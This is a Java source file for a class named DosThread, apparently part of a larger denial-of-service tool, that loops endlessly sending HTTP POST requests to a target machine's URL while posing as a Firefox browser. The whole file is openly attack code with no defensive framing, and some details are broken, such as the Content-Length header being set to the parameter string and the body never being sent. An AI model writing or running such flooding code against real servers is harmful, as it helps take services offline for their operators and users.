import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;

public class DosThread extends Thread {
    private final AtomicBoolean running=new AtomicBoolean(true);
    private final URL url;
    String param;
    public DosThread()throws Exception{
        String request = MainController.TargetMachine;
        url=new URL(request);
        param ="param="+ URLEncoder.encode("87845", StandardCharsets.UTF_8);
    }
    public void run(){
        while(running.get()){
            try{
               attack();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }

    private void attack() throws IOException {
        HttpURLConnection connection= (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);
        //to send the request
        connection.setRequestMethod("POST");
        //to send the param
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host", "localhost");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);
        System.out.println(this+" "+connection.getResponseCode());
        connection.disconnect();
    }
}
